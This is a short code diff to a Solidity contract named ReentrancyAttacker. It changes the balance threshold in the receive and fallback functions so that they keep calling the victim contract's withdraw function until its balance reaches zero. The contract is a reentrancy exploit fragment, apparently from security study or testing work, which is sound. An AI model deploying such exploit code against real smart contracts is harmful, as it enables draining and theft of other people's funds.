@@ -27,7 +27,7 @@ contract ReentrancyAttacker {
 
     receive() external payable {
         uint256 targetBalance = address(victimContract).balance;
-        if (targetBalance > 1000000000000000 wei) {
+        if (targetBalance > 0) {
             victimContract.withdraw();
         }
     }
@@ -35,7 +35,7 @@ contract ReentrancyAttacker {
     fallback() external payable {
         uint256 targetBalance = address(victimContract).balance;
 
-        if (targetBalance > 1000000000000000 wei) {
+        if (targetBalance > 0) {
             victimContract.withdraw();
         }
     }
